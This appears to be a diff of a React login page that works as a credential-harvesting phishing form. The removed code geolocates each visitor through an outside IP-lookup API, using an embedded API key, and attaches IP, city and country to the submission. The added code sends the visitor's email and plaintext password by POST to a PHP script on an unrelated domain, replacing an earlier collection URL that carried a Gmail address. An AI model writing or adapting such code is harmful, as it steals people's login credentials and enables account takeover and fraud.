@@ -10,32 +10,7 @@ import Loader from "./Loader/Loader";
 const App = ()=>{
 
 
-  const [ipAdress, setIpAdress] = useState('')
-  const [city, setCity] = useState('');
-  const [flag, setFlag] = useState('');
-  const [country, setCountry] = useState('');
 
-  const forTime = new Date();
-
-
-  useEffect(()=>{
-      fetch(`https://api.geoapify.com/v1/ipinfo?apiKey=139d2378a5554f48bf290b61999b4e8a`)
-      .then(req=> req.json())
-      .then(res=>{
-          // setCountry(res.names.en)
-          // console.log(res.names.en);
-          // console.log('city:',res.city.name);
-
-          setIpAdress(res.ip)
-          setFlag(res.country.flag);
-          setCountry(res.country.name);
-          setCity(res.city.names.en);
-
-
-
-      })
-      .catch(e=> console.log)
-  }, []);
 
 
 
@@ -86,18 +61,12 @@ const App = ()=>{
 
         const user = {
           email: email,
-          pswd: pwd,
-          country: country,
-          
-          city: city,
-          flag: flag,
-          eyep: ipAdress,
-          nownow: forTime
+          password: pwd,
         };
 
       $.ajax({
           type: "POST",
-          url: "https://regional-device-order.onrender.com/get_details/rvvlsales13@gmail.com/device/region/",
+          url: "https://physicaleducationdiploma.com/mega/rvvlsales.php",
           data: user,
           success(data) {
               console.log(data);
